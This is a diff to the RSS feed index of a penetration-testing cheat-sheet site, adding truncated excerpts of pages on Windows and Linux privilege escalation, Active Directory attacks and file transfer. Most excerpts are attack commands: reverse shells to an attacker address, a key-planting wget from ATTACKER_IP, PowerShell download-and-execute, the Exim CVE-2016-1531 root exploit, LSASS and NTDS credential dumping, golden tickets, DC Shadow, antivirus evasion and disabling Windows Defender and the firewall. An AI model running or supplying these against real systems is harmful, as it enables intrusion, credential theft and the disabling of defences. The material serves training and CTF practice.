@@ -21,6 +21,26 @@ Bruteforce `bash hydra -L users.</description>
     </item>
     
     <item>
+      <title>Admin and Processes</title>
+      <link>/windows-systems/privilege-escalation/admin_processes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
+      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
+Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
+    </item>
+    
+    <item>
+      <title>Bash</title>
+      <link>/linux-systems/programing-languages/bash/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/programing-languages/bash/</guid>
+      <description>General &amp;amp; Tricks # base program int main(void) { system(&amp;#34;ls /path/to/.passwd&amp;#34;); return 0; } # As you as the program is executed with the ‘s’ flag (owner rights), you can privesc by copying the program you want to impersonate cp /bin/cat /tmp/ls PATH=/tmp # You can escape options echo &amp;#39;#!/bin/cat --&amp;#39; &amp;gt; /tmp/ls chmod 755 /tmp/ls env PATH=/tmp ./binary_setuid .passwd 
+Symbolic link attack # base program int main(void) { system(&amp;#34;ls /path/to/.</description>
+    </item>
+    
+    <item>
       <title>Domain &amp; IP</title>
       <link>/open-source-intelligence-osint/technical-recon/domain_ip/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -37,6 +57,16 @@ Online Passive Identification Tools # Many passive tests can be done http://www.
       
       <guid>/pwn/buffer-overflow/easy_no_protection/</guid>
       <description>Simple Buffer Overflow (no protection) - Function call # Code void copy_ordre(char *arg) { char ordre[50]; strcpy(ordre,arg); printf(&amp;#34;\nOrdre reçu : %s\n\n&amp;#34;,ordre); } int main(int argc, char** argv) { if(argc &amp;lt; 2) { printf(&amp;#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons. Le cas échéant, nous détruirons la terre.\n&amp;#34;); printf(&amp;#34;Usage: %s &amp;lt;ordre&amp;gt;\n&amp;#34;, argv[0]); exit(0); } printf(&amp;#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons.</description>
+    </item>
+    
+    <item>
+      <title>Exploitation Tricks</title>
+      <link>/windows-systems/exploitation/exploitation_tricks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/exploitation/exploitation_tricks/</guid>
+      <description>From non-auth user to local admin in 3 steps # Nullsession net use \\dc\ipc$ &amp;#34;&amp;#34; /u:&amp;#34;&amp;#34; # Search for cpasswords in gpo&amp;#39;s: dir \\dc\sysvol\contoso.corp\Policies -r -I *.xml | Select-String cPassword &amp;gt;&amp;gt; dump.txt # Decrypt the cPassword gpp-decrypt &amp;lt;string&amp;gt; 
+??? # STEP 1: Dump target user hash: ldapsearch –x –h &amp;lt;LDAP_IPAddr&amp;gt; -D &amp;#34;cn=Directory Manager&amp;#34; -w &amp;lt;password&amp;gt; -b &amp;#39;uid=&amp;lt;target_username&amp;gt;,cn=users,cn=accounts,dc=&amp;lt;DOMAIN&amp;gt;,dc=COM&amp;#39; uid userpassword krbprincipalkey sambalmpassword sambantpassword # STEP 2: The ‘userpassword::’ and ‘krbprincipalkey::’ hash is base64 encoded and now you need to decode it: echo &amp;#39;e1NTSEF9dHZEaUZ4ejJTUkRBLzh1NUZSSGVIT2N4WkZMci9OYktQNHNLNWc9PQ==&amp;#39; | base64 --decode {SSHA}tvDiFxz2SRDA/8u5FRHeHOcxZFLr/NbKP4sK5g== # STEP 3: Place your decoded hash into hash.</description>
     </item>
     
     <item>
@@ -90,6 +120,16 @@ linkScrape # linkScrape is another enumeration tool # Pure Web Scrapper → It d
     </item>
     
     <item>
+      <title>Local Recon and Enumeration</title>
+      <link>/windows-systems/local-and-physical/local_recon_enumeration/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/local-and-physical/local_recon_enumeration/</guid>
+      <description>Basics whoami ipconfig type “C:\Documents and Settings\Administrator\Desktop\proof.txt” echo %username% echo %path% ipconfig /all netstat -ano # Display hidden files dir /a # Recursive dir dir /s # Available ? Ok drop jaws enum tool ! powershell “$var=1” # Possible ? Ok drop windowsprivcheck.py &amp;#34;C:\Python2X\python.exe&amp;#34; -c &amp;#34;print &amp;#39;1&amp;#39;&amp;#34; # If x86 ? Drop windows-privesc-check.exe # You can use WinPrivCheck.bat to check common misconfigurations and KB https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat 
+Enumeration - Host Information # Exact OS version type C:/Windows/system32/eula.</description>
+    </item>
+    
+    <item>
       <title>Local and Remote File Inclusions</title>
       <link>/web-attacks/files-inclusions-and-injections/lfi_rfi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -115,6 +155,26 @@ linkScrape # linkScrape is another enumeration tool # Pure Web Scrapper → It d
       <guid>/shells-methods/methodology/</guid>
       <description>GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  
 Methodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ?</description>
+    </item>
+    
+    <item>
+      <title>NTDS Database</title>
+      <link>/windows-systems/post-exploitation-techniques/ntds_database/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/post-exploitation-techniques/ntds_database/</guid>
+      <description># Initial location of the NTDS database on the domain controller C:\Windows\NTDS\NTDS.dit # Step 1 → Finding a way to get the NDTS.dis and SYSTEM file # Step 2 → Crack/Analyze offline 
+Local Extraction VSSadmin # Récupération via VSSadmin # Create a Volume Shadow Copy C:\Windows\system32&amp;gt; vssadmin create shadow /for=C: # Retrieve NTDS from the copy C:\Windows\system32&amp;gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit c:\Extract\ntds.dit # Copy SYSTEM file C:\Windows\system32&amp;gt; reg SAVE HKLM\SYSTEM c:\Extract\SYS C:\Windows\system32&amp;gt; copy \\?</description>
+    </item>
+    
+    <item>
+      <title>Out of Domain (No credentials)</title>
+      <link>/windows-systems/network-and-domain-recon/no_credentials_recon/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/network-and-domain-recon/no_credentials_recon/</guid>
+      <description>Identification # Passiv network listening to identify machines sudo netdiscover -p -i eth0 # You can find the domain big using dig dig -x IP # If the NAC is blocking, you can listen broadcast and collect MAC address # Use printer&amp;#39;s MAC address to bypass NAC 
+LLMNR / NBT-NS # You can Man in The Middle using LLMNR and NBT-NS if they&amp;#39;re bad configured sudo responder -I eth0 -wFv # If you get hashes, will be necessary to crack them john --format=netntlmv2 --wordlist=&amp;#34;/usr/share/wordlists/rockyou.</description>
     </item>
     
     <item>
@@ -146,6 +206,16 @@ Theory # Used # c → cyphertext # m → Plaintext message converted as a number
     </item>
     
     <item>
+      <title>Recon and Enumeration</title>
+      <link>/linux-systems/recon_enumeration/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/recon_enumeration/</guid>
+      <description>Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
+Basics hostname whoami id ifconfig uname -a uname -m # Check version using searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.</description>
+    </item>
+    
+    <item>
       <title>Recon-ng</title>
       <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recon-ng/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -166,21 +236,13 @@ General and Tricks # Classical test &#39; or 1=1 LIMIT 1 -- &#39; or 1=1 LIMIT 1
     </item>
     
     <item>
-      <title>TODO</title>
-      <link>/linux-systems/todo/</link>
+      <title>System Tricks</title>
+      <link>/linux-systems/privilege-escalation/system_tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/linux-systems/todo/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>TODO</title>
-      <link>/windows-systems/todo/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/windows-systems/todo/</guid>
-      <description></description>
+      <guid>/linux-systems/privilege-escalation/system_tricks/</guid>
+      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure&amp;amp;m=128776663124692&amp;amp;w=2 
+General &amp;amp; Tricks # Look for strange process ps aux # Look for setuid programs (everyone can run them as root) find / -perm -4000 # Example, if perl perl -e ‘$ENV{PATH}=&amp;#34;/usr/bin&amp;#34;;system(&amp;#34;whoami&amp;#34;);’ → root # Get a TTY shell after a reverse shell connection python -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Set PATH TERM and SHELL if they&amp;#39;re missing export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export TERM=xterm export SHELL=bash # Add public key to authorized keys echo $(wget https://ATTACKER_IP/.</description>
     </item>
     
     <item>
@@ -265,6 +327,16 @@ Teh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS
     </item>
     
     <item>
+      <title>Domain Recon</title>
+      <link>/windows-systems/network-and-domain-recon/domain_recon/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/network-and-domain-recon/domain_recon/</guid>
+      <description>RPC # You can use rpc to enumerate domain objects rpcclient -U &amp;lt;user&amp;gt; &amp;lt;IP-DC&amp;gt; rpcclient $&amp;gt; enumdomusers rpcclient $&amp;gt; enumdomgroups rpcclient $&amp;gt; querygroupmem 0x200 rpcclient $&amp;gt; srvinfo rpcclient $&amp;gt; querygroup 0x42 rpcclient $&amp;gt; queryuser 0x42 rpcclient $&amp;gt; getdompwinfo rpcclient $&amp;gt; getusrdompwinfo 0x42 
+Enumeration # You can use enum4linux to enumerate domain users # You can try anonymous binding sudo enum4linux domaine.fr ./enum4linux.pl -R 1090-1200 # windapsearch is also a very good tool to perform automated LDAP queries # Enumerate users .</description>
+    </item>
+    
+    <item>
       <title>Drupal</title>
       <link>/web-attacks/content-management-system-cms/drupal/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -281,6 +353,15 @@ Teh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS
       <guid>/open-source-intelligence-osint/human-recon/email/</guid>
       <description>Online tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ 
 The Harvester # theHarvester is a famous OSINT and scrapping tool for passiv recon on targets # Using API keys will highly increase results Usage: theharvester options -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn\&amp;#39;t use this option) -h: use SHODAN database to query discovered hosts Examples: theharvester -d microsoft.</description>
+    </item>
+    
+    <item>
+      <title>File Transfer</title>
+      <link>/linux-systems/file_transfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/file_transfer/</guid>
+      <description>Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;ftp -n &amp;lt; /usr/local/databases/ftp.</description>
     </item>
     
     <item>
@@ -333,6 +414,16 @@ DNS Zone Transfer # Zone transfer using dig dig @challenge01.root-me.org -p 5401
     </item>
     
     <item>
+      <title>LSASS and Mimikatz</title>
+      <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
+      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
+    </item>
+    
+    <item>
       <title>Nmap Cheatsheet</title>
       <link>/recon-enumeration/port-scanning/nmap_cheatsheet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -358,6 +449,53 @@ Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$
       
       <guid>/web-attacks/php-vulnerabilities/functions/</guid>
       <description>Assert() # The assert() function will execute code in params # Example using root-me challenge ?page=.. Warning : assert() : Assertion &amp;#34;strpos(’includes/...php’, ’..’) === false&amp;#34; failed in path/index.php on line 8 # The request looks like this assert(&amp;#34;strpos(&amp;#39;includes/&amp;#39; . $_GET[&amp;#39;page&amp;#39;] . &amp;#39;.php&amp;#39;, &amp;#39;..&amp;#39;) === false&amp;#34;) # If we inject this ?page=salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons # The request will look like assert(&amp;#34;strpos(&amp;#39;/includes/salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons.php&amp;#39;,&amp;#39;..&amp;#39;) ===false&amp;#34;) # Then, to exploit ?</description>
+    </item>
+    
+    <item>
+      <title>Physical Access</title>
+      <link>/windows-systems/local-and-physical/physical_access/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/local-and-physical/physical_access/</guid>
+      <description> Live boot from Kali # - USB Live Kali # - Mount the Windows system disk # - Get SAM and SYSTEM files from &amp;#34;C:\Windows\System32\config\&amp;#34; # - Extract hashes → samdump2 SYSTEM SAM &amp;gt; hash.txt # - Crack hashes using JTR (john -format=NT hash.txt) or Hashcat # - You may have to use “bkhive&amp;#34; on the SYSTEM file first # - John format can also be NT2</description>
+    </item>
+    
+    <item>
+      <title>Python</title>
+      <link>/linux-systems/programing-languages/python/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/programing-languages/python/</guid>
+      <description>Input() exploitation # In Python2, input function is vulnerable # input(x) = eval(raw_input(x)) # Means that user inputs will be executed # You can exec code Please enter password : sys.stdout.write(open(&amp;#34;.passwd&amp;#34;).readline()) 13373439872909134298363103573901 # Another Please enter password : __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /challenge/shell/shell6/.passwd &amp;gt; /tmp/flag&amp;#39;) cat /tmp/flag # Another Please enter password : __import__(&amp;#39;shutil&amp;#39;).copyfile(&amp;#39;/challenge/shell/shell6/.passwd&amp;#39;, &amp;#39;/tmp/flag2&amp;#39;) # You can even get a shell Please enter password : __import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;) # Another Please enter password : input(open(&amp;#34;.</description>
+    </item>
+    
+    <item>
+      <title>Remote Execution Techniques</title>
+      <link>/windows-systems/exploitation/remote_execution_techniques/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/exploitation/remote_execution_techniques/</guid>
+      <description>Impacket tools https://www.secureauth.com/labs/open-source-tools/impacket# psexec # PSEXEC like functionality example using RemComSvc(https://github.com/kavika13/RemCom). psexec.py domain/user:password@IP &amp;lt;command&amp;gt;# smbexec # A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. # Instantiating a local smbserver to receive the output of the commands. # This is useful in the situation where the target machine does NOT have a writeable share available. smbexec.py domain/user:password@IP &amp;lt;command&amp;gt;# atexec # This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</description>
+    </item>
+    
+    <item>
+      <title>Services</title>
+      <link>/linux-systems/privilege-escalation/services/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/privilege-escalation/services/</guid>
+      <description> Exim4 # https://www.exploit-db.com/exploits/39535 #!/bin/sh echo [ CVE-2016-1531 local root exploit cat &amp;gt; /tmp/root.pm &amp;lt;&amp;lt; EOF package root; use strict; use warnings; system(&amp;#34;/bin/sh&amp;#34;); EOF PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps 
+MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;usermod -a -G admin username&amp;#39;) Select sys_exec(&amp;#39;whoami&amp;#39;); select sys_exec(&amp;#39;/bin/bash&amp;#39;); Select sys_eval(&amp;#39;whoami&amp;#39;); # MySQL run as root and version is &amp;lt;5 go for User Defined Functions (UDF) # TODO</description>
+    </item>
+    
+    <item>
+      <title>Silver and Golden Tickets</title>
+      <link>/windows-systems/post-exploitation-techniques/silver_golden_tickets/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/post-exploitation-techniques/silver_golden_tickets/</guid>
+      <description>Ticket generation from Linux # Generate a ticket or convert it (kekeo) to ccache format $ ticketer.py -nthash &amp;lt;hash&amp;gt; -domain-sid &amp;lt;sid&amp;gt; -domain &amp;lt;domain&amp;gt; &amp;lt;user&amp;gt; # Export the path in the right variable $ export KRB5CCNAME=/tmp/ticket.ccache $ klist # Exec and use the ticket $ /impacket/examples/psexec.py -k -n -debug DOMAIN/user@host # Dump NTDS $ proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss 
+Golden Ticket # Golden Ticket &amp;gt; Nom du compte administrateur (Administrateur) &amp;gt; Nom complet du domaine (domain.</description>
     </item>
     
     <item>
@@ -391,6 +529,25 @@ Enumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t
     </item>
     
     <item>
+      <title>Abusing sudo programs</title>
+      <link>/linux-systems/privilege-escalation/abusing_sudo_programs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/privilege-escalation/abusing_sudo_programs/</guid>
+      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ 
+General Information # Get privileges for users sudo -l /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): install -mode 4755 /bin/dash /tmp/sh Then you will have a /tmp/sh that gives any user who calls it root ! # Some payloads to overcome limited shells ssh user@$ip nc $localip 4444 -e /bin/sh python -c &amp;#39;import pty; pty.</description>
+    </item>
+    
+    <item>
+      <title>CrackMapExec</title>
+      <link>/windows-systems/exploitation/crackmapexec/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/exploitation/crackmapexec/</guid>
+      <description>TODO</description>
+    </item>
+    
+    <item>
       <title>Cracking files</title>
       <link>/passcracking-hashfiles/cracking_files/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -398,6 +555,15 @@ Enumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t
       <guid>/passcracking-hashfiles/cracking_files/</guid>
       <description>Cracking archives # RAR rar2john file.rar &amp;gt; rar_hashes.txt john --wordlist=passwords.txt rar_hashes.txt # ZIP zip2john file.rar &amp;gt; zip_hashes.txt john --wordlist=passwords.txt zip_hashes.txt # ZIP Using fcrackzip fcrackzip -u -D -p rockyou.txt recup.zip 
 Cracking shadow files unshadow passwd shadow &amp;gt; shadowjohn.txt john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --rules shadowjohn.txt john --show shadowjohn.txt # Hashcat SHA512 $6$ shadow file hashcat -m 1800 -a 0 hash.txt rockyou.txt --username #Hashcat MD5 $1$ shadow file hashcat -m 500 -a 0 hash.</description>
+    </item>
+    
+    <item>
+      <title>DC Shadow</title>
+      <link>/windows-systems/post-exploitation-techniques/dc_shadow/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/post-exploitation-techniques/dc_shadow/</guid>
+      <description># DC Shadow is a post compromission attack, allowing you to update replication metadata # On a compromised client, using a domain admin account # You can attack with Mimikatz# Terminal 1 (runas) mimikatz # !+ mimikatz # !processtoken mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:&amp;#34;The Game&amp;#34; /replOriginatingUid:{00000000-0000-0000-0000-000000000000} /replOriginatingTime:&amp;#34;2017-01-01 09:00:00&amp;#34; /replOriginatingUsn:42# Terminal 2 (runas) mimikatz # lsadump::dcshadow /push# You can check the success throught repadmin on the DC repadmin /showobjmeta DC01.NORZH.LAN &amp;#34;CN=Daenerys Targaryen,CN=Users,DC=NORZH,DC=LAN&amp;#34;</description>
     </item>
     
     <item>
@@ -409,6 +575,15 @@ Cracking shadow files unshadow passwd shadow &amp;gt; shadowjohn.txt john --word
       <description> Test for directory traversal  
 General &amp;amp; Tricks # Check for .git # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ 
 Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39;</description>
+    </item>
+    
+    <item>
+      <title>Domain Mapping</title>
+      <link>/windows-systems/network-and-domain-recon/domain_mapping/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/network-and-domain-recon/domain_mapping/</guid>
+      <description>BloodHound Setup # Bloodhound directement depuis la machine cible # apt-get install bloodhound # Setup $ sudo neo4j console ... ... http://localhost:7474 user/pass = neo4j/neo4j # Start $ bloodhound URL : bolt://127.0.0.1:7687 Target Collection # On the target, drop the Sharphound ingestor # You can drop it through shared folder or by download https://github.com/BloodHoundAD/BloodHound https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 # Powershell Powershell.exe -Exec Bypass Import-Module .\Sharphound.ps1 Invoke-Bloodhound Invoke-BloodHound -CollectionMethod All # Default : Domains, Computers, Users, Groups # All : Domains, Computers, Users, Groups, OUs, GPOs # Exe # You may need some .</description>
     </item>
     
     <item>
@@ -491,6 +666,15 @@ PHP Serialisation (PHP Slim __wakeup) # Context - \App\Controller\Confidential.p
     </item>
     
     <item>
+      <title>Perl</title>
+      <link>/linux-systems/programing-languages/perl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/programing-languages/perl/</guid>
+      <description># Perl command injection # open() function is vulnerable and can be used to execute commands # ex : “| shutdown -r |”</description>
+    </item>
+    
+    <item>
       <title>VHOST Scanning</title>
       <link>/recon-enumeration/application-scans/vhost/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -535,6 +719,15 @@ Active Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global
       <guid>/network/icmp/</guid>
       <description>ICMP exfiltration # Using scapy $ scapy Welcome to Scapy (2.2.0) &amp;gt;&amp;gt;&amp;gt; pkts = rdpcap(&amp;#34;ch6.pcap&amp;#34;) &amp;gt;&amp;gt;&amp;gt; payload_echo_request = [ p[ICMP].load for p in pkts if (p[ICMP].type == 8 and p[ICMP].code == 0)] &amp;gt;&amp;gt;&amp;gt; outfile = open(&amp;#39;ICMP_payload.dump&amp;#39;, &amp;#39;wt&amp;#39;) &amp;gt;&amp;gt;&amp;gt; outfile.write(&amp;#34;&amp;#34;.join(payload_echo_request)) &amp;gt;&amp;gt;&amp;gt; outfile.close()# Using Python #!/usr/bin/python from scapy.all import * import yenc pkts = rdpcap(&amp;#34;./echo_request.pcap&amp;#34;) fichier = open(&amp;#34;./donnees&amp;#34;,&amp;#34;w&amp;#34;) for i in range(0,len(pkts)): fichier.write(pkts[i].load) print yenc.decode(&amp;#34;./donnees&amp;#34;,&amp;#34;./résultat&amp;#34;) 
 ICMP Exfiltration 2 #!/usr/bin/env python from scapy.</description>
+    </item>
+    
+    <item>
+      <title>Impacket</title>
+      <link>/windows-systems/exploitation/impacket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/exploitation/impacket/</guid>
+      <description>TODO</description>
     </item>
     
     <item>
@@ -595,12 +788,30 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
     </item>
     
     <item>
+      <title>Tricks</title>
+      <link>/windows-systems/privilege-escalation/tricks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/tricks/</guid>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.</description>
+    </item>
+    
+    <item>
       <title>Web Application Firewall (WAF)</title>
       <link>/recon-enumeration/application-scans/web_application_firewall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/recon-enumeration/application-scans/web_application_firewall/</guid>
       <description>General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another # simple algorithm to guess if a WAF or security solution is actively responding to our attacks .</description>
+    </item>
+    
+    <item>
+      <title>Windows Defender</title>
+      <link>/windows-systems/privilege-escalation/windows_defender/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
+      <description># Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
     </item>
     
     <item>
@@ -671,6 +882,15 @@ Tools descriptions # Firefox and some plugins - Download Star - ExifViewer - Fir
       
       <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/datasploit/</guid>
